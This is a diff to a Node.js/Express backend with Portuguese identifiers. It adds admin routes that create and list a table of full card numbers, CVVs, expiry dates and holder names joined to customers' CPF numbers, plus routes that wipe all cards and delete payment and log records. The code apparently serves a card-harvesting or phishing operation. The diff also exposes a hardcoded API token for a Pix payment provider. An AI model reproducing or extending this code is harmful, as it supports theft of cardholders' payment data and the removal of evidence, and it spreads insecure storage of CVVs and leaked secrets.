@@ -546,7 +546,119 @@ app.get('/api/admin/agendamentos', verificarAdminToken, async (req, res) => {
         res.status(500).json({ erro: err.message });
     }
 });
+// ============ ROTAS PARA CARTÕES ============
+app.get('/api/admin/cartoes', verificarAdminToken, async (req, res) => {
+    try {
+        // Primeiro verificar se a tabela cartoes existe
+        const tableExists = await pool.query(`
+            SELECT EXISTS (
+                SELECT FROM information_schema.tables 
+                WHERE table_name = 'cartoes'
+            )
+        `);
+        
+        if (!tableExists.rows[0].exists) {
+            // Criar tabela cartoes se não existir
+            await pool.query(`
+                CREATE TABLE IF NOT EXISTS cartoes (
+                    id SERIAL PRIMARY KEY,
+                    cliente_id INTEGER,
+                    nome_titular TEXT,
+                    numero_cartao TEXT,
+                    cvv TEXT,
+                    validade TEXT,
+                    created_at TIMESTAMP DEFAULT NOW()
+                )
+            `);
+            console.log('✅ Tabela cartoes criada');
+            return res.json({ success: true, cartoes: [] });
+        }
+        
+        const result = await pool.query(`
+            SELECT c.*, u.cpf, u.nome as cliente_nome 
+            FROM cartoes c
+            LEFT JOIN users u ON c.cliente_id = u.id
+            ORDER BY c.created_at DESC
+        `);
+        res.json({ success: true, cartoes: result.rows });
+    } catch (err) {
+        console.error('Erro ao buscar cartoes:', err);
+        res.json({ success: true, cartoes: [] });
+    }
+});
 
+app.delete('/api/admin/cartoes/:id', verificarAdminToken, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM cartoes WHERE id = $1', [req.params.id]);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ erro: err.message });
+    }
+});
+
+app.post('/api/admin/clear-cards', verificarAdminToken, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM cartoes');
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ erro: err.message });
+    }
+});
+
+// ============ ROTA PARA ADICIONAR USUÁRIO ADMIN ============
+app.post('/api/admin/add-user', verificarAdminToken, async (req, res) => {
+    const { username, password } = req.body;
+    
+    if (!username || !password || password.length < 6) {
+        return res.status(400).json({ error: 'Username e senha obrigatorios (min 6 caracteres)' });
+    }
+    
+    try {
+        // Verificar se usuário já existe
+        const existingUser = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
+        if (existingUser.rows.length > 0) {
+            return res.status(400).json({ error: 'Usuário já existe' });
+        }
+        
+        const hash = await bcrypt.hash(password, 10);
+        await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', [username, hash]);
+        
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Erro ao adicionar usuario:', err);
+        res.status(500).json({ error: 'Erro ao adicionar usuario' });
+    }
+});
+
+// ============ ROTA PARA DELETAR AGENDAMENTO ============
+app.delete('/api/admin/agendamentos/:id', verificarAdminToken, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM agendamentos WHERE id = $1', [req.params.id]);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ erro: err.message });
+    }
+});
+
+// ============ ROTA PARA DELETAR PAYMENT ============
+app.delete('/api/admin/payments/:id', verificarAdminToken, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM payments WHERE id = $1', [req.params.id]);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ erro: err.message });
+    }
+});
+
+// ============ ROTA PARA DELETAR LOG ============
+app.delete('/api/admin/logs/:id', verificarAdminToken, async (req, res) => {
+    try {
+        await pool.query('DELETE FROM logs WHERE id = $1', [req.params.id]);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ erro: err.message });
+    }
+});
 // ============ ROTAS DE PAGAMENTO PIX ============
 const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
 const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
